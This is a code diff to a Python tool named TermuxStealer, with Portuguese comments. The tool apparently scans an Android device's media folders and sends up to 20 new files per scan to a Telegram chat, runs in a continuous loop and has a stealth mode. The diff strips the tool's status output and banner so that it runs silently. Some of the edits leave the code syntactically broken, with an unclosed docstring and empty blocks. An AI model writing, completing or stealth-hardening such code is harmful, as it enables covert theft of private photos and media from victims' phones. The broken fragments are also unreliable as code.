@@ -147,12 +147,9 @@ class TermuxStealer:
         self.chat_id = CONFIG["chat_id"]
         self.sent_hashes = set()
         self.load_hashes()
-        
+    
         print("=" * 50)
-        print("TERMUX MEDIA STEALER")
-        print("=" * 50)
-        print(f"Chat: {self.chat_id}")
-        print(f"Monitorando: {len(MEDIA_DIRS)} pastas")
+
     
     def load_hashes(self):
         """Carrega hashes já enviados"""
@@ -260,11 +257,9 @@ class TermuxStealer:
             return False
     
     def scan_once(self):
-        """Faz um scan único"""
-        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Buscando mídias...")
+        """Faz um scan único
         
         media_files = self.find_media()
-        print(f"[*] Encontradas: {len(media_files)} mídias")
         
         sent = 0
         for file_path in media_files[:20]:  # Limita a 20 por vez
@@ -274,7 +269,7 @@ class TermuxStealer:
                 time.sleep(1)  # Evita flood
         
         if sent > 0:
-            print(f"[✓] {sent} arquivos enviados")
+            
         else:
             print("[*] Nenhum arquivo novo")
         
@@ -282,24 +277,22 @@ class TermuxStealer:
     
     def run_continuous(self):
         """Executa continuamente"""
-        print("[*] Modo contínuo ativado")
-        print("[*] Pressione Ctrl+C para parar\n")
         
         try:
             while True:
                 self.scan_once()
                 
                 wait = CONFIG["scan_interval"]
-                print(f"[*] Próximo scan em {wait//60} minutos...")
+                
                 
                 # Contagem regressiva
                 for i in range(wait, 0, -1):
                     if i % 60 == 0 and not CONFIG["stealth_mode"]:
-                        print(f"[*] {i//60} minutos restantes")
+                    
                     time.sleep(1)
                     
         except KeyboardInterrupt:
-            print("\n\n[*] Encerrando...")
+            
             self.save_hashes()
     
     def install_deps(self):
